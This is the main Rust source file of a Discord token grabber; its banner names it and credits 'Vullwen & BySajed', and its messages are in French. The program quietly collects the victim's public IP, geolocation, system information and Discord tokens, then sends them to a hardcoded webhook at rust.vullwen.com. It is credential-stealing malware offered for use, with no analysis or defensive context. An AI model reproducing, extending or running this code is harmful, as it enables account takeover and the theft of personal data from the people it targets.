mod exfiltrator;
mod extractor;
mod utils;

use exfiltrator::Exfiltrator;
use extractor::Extractor;
use utils::{get_geolocation, get_public_ip, get_system_info, get_timestamp};

use clap::Parser;
use serde_json::json;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    debug: bool,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    let debug = args.debug;

    if debug {
        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        println!("Token Grabber by Vullwen & BySajed");
        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");

        println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        println!("Recherche d'informations...");
        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
    }
    let ip = match get_public_ip().await {
        Ok(Some(ip_str)) => {
            if debug {
                println!("IP publique : {}", ip_str);
            }
            ip_str
        }
        Ok(None) => {
            if debug {
                eprintln!("Impossible de récupérer l'IP publique");
            }
            return;
        }
        Err(e) => {
            if debug {
                eprintln!("Erreur lors de la récupération de l'IP : {}", e);
            }
            return;
        }
    };
    if debug {
        println!("Géolocalisation de l’IP :");
    }
    if let Some((city, country)) = get_geolocation(&ip).await {
        if debug {
            println!("IP {} → {}, {}", ip, city, country);
        }
    } else {
        if debug {
            eprintln!("Impossible de géolocaliser l’IP {}", ip);
        }
    }

    //Init
    let extractor = Extractor::new();
    let webhook_url = "https://rust.vullwen.com/webhook.php";
    let exfiltrator = Exfiltrator::new(webhook_url);

    let mut entries = Vec::new();
    if debug {
        println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        println!("Recherche de tokens...");
        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
    }
    let tokens = extractor.extract_discord_tokens(debug);
    //supprimer les doublons
    let tokens: Vec<String> = tokens
        .into_iter()
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();
    let sys_info = get_system_info();
    let ts = get_timestamp();
    let location = match get_geolocation(&ip).await {
        Some((city, country)) => format!("{}, {}", city, country),
        None => String::from("Unknown"),
    };

    // Préparation de la structure serialisable
    let data = json!({
        "ip": ip,
        "location": location,
        "tokens":tokens,
        "system_info": sys_info,
        "timestamp": ts
    });
    entries.push(data);

    if debug {
        println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
        println!("Envoi...");
        println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
    }
    if let Err(err) = run_token_grabber(&exfiltrator, entries, debug).await {
        if debug {
            eprintln!("Erreur lors de l’exécution : {}", err);
        }
    }
}

async fn run_token_grabber(
    exfiltrator: &Exfiltrator,
    entries: Vec<serde_json::Value>,
    debug: bool,
) -> Result<(), String> {
    for entry in entries.into_iter() {
        if debug {
            println!("Traitement de l’entrée au timestamp {}", entry["timestamp"]);
        }

        let data_struct: extractor::ExtractedData = serde_json::from_value(entry.clone())
            .map_err(|e| format!("Conversion JSON en ExtractedData : {}", e))?;

        match exfiltrator.send_data(&data_struct).await {
            Ok(payload) => {
                if debug {
                    println!(
                        "Payload renvoyé : {}",
                        serde_json::to_string_pretty(&payload).unwrap()
                    );
                }
            }
            Err(err) => return Err(err),
        }
    }
    Ok(())
}
